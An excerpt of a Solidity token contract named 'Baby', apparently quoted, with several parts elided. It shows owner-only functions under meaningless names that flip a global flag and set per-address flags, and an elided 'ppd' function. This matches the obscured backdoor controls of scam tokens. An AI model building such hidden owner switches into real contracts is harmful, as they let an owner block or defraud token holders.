...
contract Baby is Context, IERC20, Ownable {
    ...
    bool public qwert = true;
    mapping (address => bool) public qwertee;
    ...
    function ppd(address account, uint256 amount) onlyOwner() public {
    ...
    function xxbb(bool _status) public onlyOwner {
        qwert = _status;
    }

    function aass(address addre, bool status) public onlyOwner {
        qwertee[addre]  = status;
    }
